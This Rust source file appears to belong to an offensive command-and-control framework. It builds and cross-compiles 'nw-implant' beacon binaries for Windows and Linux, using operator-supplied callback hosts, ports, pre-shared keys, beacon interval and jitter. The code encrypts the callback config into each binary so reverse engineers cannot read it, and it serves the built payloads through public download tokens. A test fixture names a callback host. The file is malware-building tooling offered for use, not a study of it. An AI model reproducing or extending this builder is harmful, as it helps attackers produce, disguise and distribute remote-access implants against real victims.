use std::collections::HashMap;
use std::path::{Path, PathBuf};
use std::sync::{LazyLock, Mutex};

use anyhow::{Context, Result};
use serde::{Deserialize, Serialize};
use tokio::process::Command;
use uuid::Uuid;

const PAYLOAD_DIR: &str = "./payloads";

#[derive(Deserialize, Clone, Debug, Default)]
pub struct BuildRequest {
    pub name: String,
    pub lhost: String,
    #[serde(default)]
    pub lport: u16,
    pub psk: String,
    pub protocol: String,
    #[serde(default)]
    pub gsocket_secret: Option<String>,
    #[serde(default)]
    pub gsocket_local_port: Option<u16>,
    pub os: String,
    pub arch: String,
    #[serde(default)]
    pub interval_ms: u64,
    #[serde(default)]
    pub jitter_ms: u64,
    /// Rust target triple. Empty means "build for the host".
    #[serde(default)]
    pub target: String,
}

#[derive(Serialize, Deserialize, Clone, Debug)]
pub struct PayloadMeta {
    pub file: String,
    pub name: String,
    pub os: String,
    pub arch: String,
    pub protocol: String,
    pub lhost: String,
    pub lport: u16,
    pub psk: String,
    #[serde(default)]
    pub interval_ms: u64,
    #[serde(default)]
    pub jitter_ms: u64,
    #[serde(default)]
    pub target: String,
    #[serde(default)]
    pub public_id: String,
    pub size: u64,
    pub built_at: String,
}

/// A build currently running in the background, surfaced to the loading screen.
#[derive(Serialize, Clone, Debug)]
pub struct BuildJob {
    pub file: String,
    pub name: String,
    pub target: String,
    pub os: String,
    pub arch: String,
    pub started_at: String,
}

static BUILDING: LazyLock<Mutex<HashMap<String, BuildJob>>> =
    LazyLock::new(|| Mutex::new(HashMap::new()));

pub fn mark_building(job: BuildJob) {
    if let Ok(mut map) = BUILDING.lock() {
        map.insert(job.file.clone(), job);
    }
}

pub fn unmark_building(file: &str) {
    if let Ok(mut map) = BUILDING.lock() {
        map.remove(file);
    }
}

pub fn building_jobs() -> Vec<BuildJob> {
    BUILDING
        .lock()
        .map(|map| {
            let mut v: Vec<BuildJob> = map.values().cloned().collect();
            v.sort_by(|a, b| b.started_at.cmp(&a.started_at));
            v
        })
        .unwrap_or_default()
}

/// `(file, error, at)` for recent failed builds, surfaced in the payload UI.
static RECENT_ERRORS: LazyLock<Mutex<Vec<(String, String, String)>>> =
    LazyLock::new(|| Mutex::new(Vec::new()));

pub fn record_build_error(file: &str, err: &str) {
    if let Ok(mut v) = RECENT_ERRORS.lock() {
        v.retain(|(f, _, _)| f != file);
        v.insert(
            0,
            (
                file.to_owned(),
                err.to_owned(),
                chrono::Utc::now().to_rfc3339(),
            ),
        );
        v.truncate(10);
    }
}

pub fn clear_build_errors(file: &str) {
    if let Ok(mut v) = RECENT_ERRORS.lock() {
        v.retain(|(f, _, _)| f != file);
    }
}

pub fn recent_errors() -> Vec<(String, String, String)> {
    RECENT_ERRORS.lock().map(|v| v.clone()).unwrap_or_default()
}

/// The output file name a request will produce, without building.
pub fn predict_file(req: &BuildRequest) -> String {
    let name = if sanitize(&req.name).is_empty() {
        "implant".to_owned()
    } else {
        sanitize(&req.name)
    };
    build_id(&name, &req.os, &req.arch)
}

fn sanitize(name: &str) -> String {
    name.chars()
        .filter(|c| c.is_ascii_alphanumeric() || *c == '-' || *c == '_')
        .collect::<String>()
        .trim_matches('-')
        .to_owned()
}

/// Output path of the freshly built implant for the given (possibly empty) target triple.
fn built_binary(target: &str) -> PathBuf {
    let workspace = env!("CARGO_MANIFEST_DIR");
    let exe = if target.contains("windows") {
        ".exe"
    } else {
        ""
    };
    if target.is_empty() {
        Path::new(workspace).join(format!("target/release/nw-implant{exe}"))
    } else {
        Path::new(workspace).join(format!("target/{target}/release/nw-implant{exe}"))
    }
}

fn build_id(name: &str, os: &str, arch: &str) -> String {
    format!("{name}.{os}.{arch}")
}

pub async fn build(req: &BuildRequest) -> Result<PayloadMeta> {
    let name = if sanitize(&req.name).is_empty() {
        "implant".to_owned()
    } else {
        sanitize(&req.name)
    };
    let file = build_id(&name, &req.os, &req.arch);
    std::fs::create_dir_all(PAYLOAD_DIR).with_context(|| format!("create {PAYLOAD_DIR}"))?;
    clear_build_errors(&file);

    mark_building(BuildJob {
        file: file.clone(),
        name: name.clone(),
        target: req.target.clone(),
        os: req.os.clone(),
        arch: req.arch.clone(),
        started_at: chrono::Utc::now().to_rfc3339(),
    });

    let result = do_build(req, &name, &file).await;
    unmark_building(&file);
    result
}

/// Resolve a cargo binary that can see rustup-installed cross-compilation
/// targets. Prefers an explicit override, then rustup's cargo shim
/// (`~/.cargo/bin/cargo`), then plain `cargo` on PATH.
fn cargo_bin() -> PathBuf {
    if let Ok(explicit) = std::env::var("NAUGHTYWOLF_CARGO") {
        let p = PathBuf::from(explicit);
        if p.is_file() {
            return p;
        }
    }
    if let Ok(home) = std::env::var("HOME") {
        let shim = Path::new(&home).join(".cargo/bin/cargo");
        if shim.is_file() {
            return shim;
        }
    }
    PathBuf::from("cargo")
}

fn rustc_bin() -> PathBuf {
    if let Ok(explicit) = std::env::var("NAUGHTYWOLF_RUSTC") {
        let p = PathBuf::from(explicit);
        if p.is_file() {
            return p;
        }
    }
    if let Ok(home) = std::env::var("HOME") {
        let shim = Path::new(&home).join(".cargo/bin/rustc");
        if shim.is_file() {
            return shim;
        }
    }
    PathBuf::from("rustc")
}

/// The active toolchain's `bin/rustc`, derived from `rustc --print sysroot`.
/// Forcing this on cargo makes cross-compilation targets (added via rustup) be
/// visible to the build instead of whatever `rustc` cargo otherwise auto-picks.
async fn toolchain_rustc() -> Option<PathBuf> {
    let out = Command::new(rustc_bin())
        .arg("--print")
        .arg("sysroot")
        .output()
        .await
        .ok()?;
    if !out.status.success() {
        return None;
    }
    let sysroot = String::from_utf8(out.stdout).ok()?.trim().to_owned();
    let p = Path::new(&sysroot).join("bin/rustc");
    p.is_file().then_some(p)
}

async fn do_build(req: &BuildRequest, name: &str, file: &str) -> Result<PayloadMeta> {
    let (payload_config, metadata_host, metadata_port) = if req.protocol == "gs" {
        let secret = req
            .gsocket_secret
            .as_deref()
            .map(str::trim)
            .filter(|secret| !secret.is_empty())
            .context("GSocket secret is required")?;
        let local_port = req
            .gsocket_local_port
            .filter(|port| *port > 0)
            .unwrap_or(req.lport);
        (
            nw_profile::config::PayloadConfig {
                endpoint: format!("gs://127.0.0.1:{local_port}"),
                psk: req.psk.clone(),
                gsocket: Some(nw_profile::config::GSocketConfig {
                    secret: secret.to_owned(),
                    local_port,
                }),
            },
            "127.0.0.1".to_owned(),
            local_port,
        )
    } else {
        (
            nw_profile::config::PayloadConfig {
                endpoint: format!("{}://{}:{}", req.protocol, req.lhost, req.lport),
                psk: req.psk.clone(),
                gsocket: None,
            },
            req.lhost.clone(),
            req.lport,
        )
    };
    let workspace = env!("CARGO_MANIFEST_DIR");
    let bin = cargo_bin();
    let mut args = vec!["build", "--release", "-p", "nw-implant"];
    if !req.target.is_empty() {
        // rustup target add is idempotent; ensures the toolchain has the target
        // std (needs network the first time). Failure here is non-fatal: the
        // cargo build below reports the authoritative error for the UI.
        let _ = Command::new("rustup")
            .args(["target", "add", &req.target])
            .status()
            .await;
        args.push("--target");
        args.push(&req.target);
    }
    let mut cmd = Command::new(&bin);
    if let Some(toolchain) = toolchain_rustc().await {
        // Tie cargo to the rustup toolchain's rustc so cross std links up.
        cmd.env("RUSTC", &toolchain);
    }
    // Bake the endpoint/PSK as an encrypted blob so the callback isn't a
    // plaintext string in the binary (anti-RE).
    let cfg_blob = nw_profile::config::encrypt_payload_config(&payload_config)?;
    let status = cmd
        .current_dir(workspace)
        .args(&args)
        .env("NW_CFG", &cfg_blob)
        .env("NW_INTERVAL", req.interval_ms.to_string())
        .env("NW_JITTER", req.jitter_ms.to_string())
        .status()
        .await
        .context("failed to spawn cargo build")?;
    anyhow::ensure!(status.success(), "implant build failed with {status}");

    let built = built_binary(&req.target);
    let dest = PathBuf::from(PAYLOAD_DIR).join(file);
    tokio::fs::copy(&built, &dest)
        .await
        .with_context(|| format!("copy built implant to {dest:?}"))?;

    let meta = PayloadMeta {
        file: file.to_owned(),
        name: name.to_owned(),
        os: req.os.clone(),
        arch: req.arch.clone(),
        protocol: req.protocol.clone(),
        lhost: metadata_host,
        lport: metadata_port,
        psk: req.psk.clone(),
        interval_ms: req.interval_ms,
        jitter_ms: req.jitter_ms,
        target: req.target.clone(),
        public_id: Uuid::new_v4().to_string(),
        size: std::fs::metadata(&dest).map(|m| m.len()).unwrap_or(0),
        built_at: chrono::Utc::now().to_rfc3339(),
    };
    let sidecar = PathBuf::from(PAYLOAD_DIR).join(format!("{file}.json"));
    tokio::fs::write(&sidecar, serde_json::to_vec_pretty(&meta)?)
        .await
        .context("write payload metadata")?;
    Ok(meta)
}

pub fn list() -> Result<Vec<PayloadMeta>> {
    let dir = Path::new(PAYLOAD_DIR);
    list_from_dir(dir)
}

fn list_from_dir(dir: &Path) -> Result<Vec<PayloadMeta>> {
    if !dir.exists() {
        return Ok(Vec::new());
    }
    let mut out = Vec::new();
    for entry in std::fs::read_dir(dir)? {
        let entry = entry?;
        let path = entry.path();
        let fname = entry.file_name().to_string_lossy().to_string();
        if path.extension().map(|e| e == "json").unwrap_or(false) {
            continue;
        }
        let sidecar = dir.join(format!("{fname}.json"));
        let mut meta = if sidecar.exists() {
            serde_json::from_slice::<PayloadMeta>(&std::fs::read(&sidecar)?)
                .unwrap_or_else(|_| fallback_meta(&fname, &path))
        } else {
            fallback_meta(&fname, &path)
        };
        if Uuid::parse_str(&meta.public_id).is_err() {
            meta.public_id = Uuid::new_v4().to_string();
            std::fs::write(&sidecar, serde_json::to_vec_pretty(&meta)?)?;
        }
        out.push(meta);
    }
    out.sort_by(|a, b| b.built_at.cmp(&a.built_at));
    Ok(out)
}

fn fallback_meta(fname: &str, path: &Path) -> PayloadMeta {
    PayloadMeta {
        file: fname.to_owned(),
        name: fname.to_owned(),
        os: "unknown".into(),
        arch: "unknown".into(),
        protocol: "unknown".into(),
        lhost: "unknown".into(),
        lport: 0,
        psk: "".into(),
        interval_ms: 0,
        jitter_ms: 0,
        target: String::new(),
        public_id: String::new(),
        size: std::fs::metadata(path).map(|m| m.len()).unwrap_or(0),
        built_at: chrono::Utc::now().to_rfc3339(),
    }
}

pub fn download_path(file: &str) -> Option<PathBuf> {
    let candidate = PathBuf::from(PAYLOAD_DIR).join(file);
    if candidate.is_file() {
        Some(candidate)
    } else {
        None
    }
}

/// Resolve an unguessable public download token to the artifact it names.
/// The path comes from the directory entry, never from sidecar-controlled data.
pub fn public_download(token: &str) -> Option<(PathBuf, String)> {
    public_download_from_dir(Path::new(PAYLOAD_DIR), token)
}

fn public_download_from_dir(dir: &Path, token: &str) -> Option<(PathBuf, String)> {
    let token = Uuid::parse_str(token).ok()?.to_string();
    for entry in std::fs::read_dir(dir).ok()? {
        let Ok(entry) = entry else { continue };
        let path = entry.path();
        if !path.is_file() || path.extension().is_some_and(|ext| ext == "json") {
            continue;
        }
        let filename = entry.file_name().to_string_lossy().to_string();
        let sidecar = dir.join(format!("{filename}.json"));
        let Ok(bytes) = std::fs::read(sidecar) else {
            continue;
        };
        let Ok(metadata) = serde_json::from_slice::<serde_json::Value>(&bytes) else {
            continue;
        };
        if metadata.get("public_id").and_then(|id| id.as_str()) == Some(token.as_str()) {
            return Some((path, filename));
        }
    }
    None
}

/// Fresh random PSK for the build form default.
pub fn random_psk() -> String {
    Uuid::new_v4().to_string()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn sanitize_keeps_identifier_chars() {
        assert_eq!(sanitize("my-implant_2"), "my-implant_2");
        assert_eq!(sanitize("a b/c!d"), "abcd");
        assert_eq!(sanitize("---"), "");
    }

    #[test]
    fn build_id_and_binary_path() {
        assert_eq!(build_id("x", "linux", "amd64"), "x.linux.amd64");
        assert!(built_binary("").ends_with("target/release/nw-implant"));
        assert!(
            built_binary("x86_64-unknown-linux-musl")
                .ends_with("target/x86_64-unknown-linux-musl/release/nw-implant")
        );
        assert!(
            built_binary("x86_64-pc-windows-gnu")
                .ends_with("target/x86_64-pc-windows-gnu/release/nw-implant.exe")
        );
    }

    #[test]
    fn building_jobs_empty_by_default() {
        assert!(building_jobs().is_empty());
    }

    #[test]
    fn predict_file_matches_build_output_prefix() {
        let req = BuildRequest {
            name: "win-1".into(),
            lhost: "127.0.0.1".into(),
            lport: 8080,
            psk: "x".into(),
            protocol: "http".into(),
            gsocket_secret: None,
            gsocket_local_port: None,
            os: "windows".into(),
            arch: "amd64".into(),
            interval_ms: 1000,
            jitter_ms: 200,
            target: "x86_64-pc-windows-gnu".into(),
        };
        assert_eq!(predict_file(&req), "win-1.windows.amd64");

        record_build_error("win-1.windows.amd64", "boom");
        assert_eq!(recent_errors()[0].0, "win-1.windows.amd64");
        clear_build_errors("win-1.windows.amd64");
        assert!(recent_errors().is_empty());
    }

    #[test]
    fn legacy_payload_gets_one_persisted_public_uuid() {
        let temp = tempfile::tempdir().unwrap();
        let file = "legacy.linux.amd64";
        std::fs::write(temp.path().join(file), b"payload").unwrap();
        let sidecar = temp.path().join(format!("{file}.json"));
        std::fs::write(
            &sidecar,
            serde_json::to_vec(&serde_json::json!({
                "file": file,
                "name": "legacy",
                "os": "linux",
                "arch": "amd64",
                "protocol": "https",
                "lhost": "gateofbabylon.space",
                "lport": 443,
                "psk": "test-only",
                "interval_ms": 5000,
                "jitter_ms": 1000,
                "target": "x86_64-unknown-linux-musl",
                "size": 7,
                "built_at": "2026-09-10T00:00:00Z"
            }))
            .unwrap(),
        )
        .unwrap();

        let first = list_from_dir(temp.path()).unwrap();
        let public_id = first[0].public_id.clone();
        assert!(Uuid::parse_str(&public_id).is_ok());
        assert_eq!(list_from_dir(temp.path()).unwrap()[0].public_id, public_id);

        let persisted: serde_json::Value =
            serde_json::from_slice(&std::fs::read(sidecar).unwrap()).unwrap();
        assert_eq!(persisted["public_id"], public_id);
    }

    #[test]
    fn public_download_skips_unrelated_artifacts_without_metadata() {
        let temp = tempfile::tempdir().unwrap();
        std::fs::write(temp.path().join("orphan.bin"), b"orphan").unwrap();
        let token = "550e8400-e29b-41d4-a716-446655440000";
        let file = "wanted.bin";
        std::fs::write(temp.path().join(file), b"wanted").unwrap();
        std::fs::write(
            temp.path().join(format!("{file}.json")),
            serde_json::to_vec(&serde_json::json!({ "public_id": token })).unwrap(),
        )
        .unwrap();

        let (_, filename) = public_download_from_dir(temp.path(), token).unwrap();
        assert_eq!(filename, "wanted.bin");
    }
}
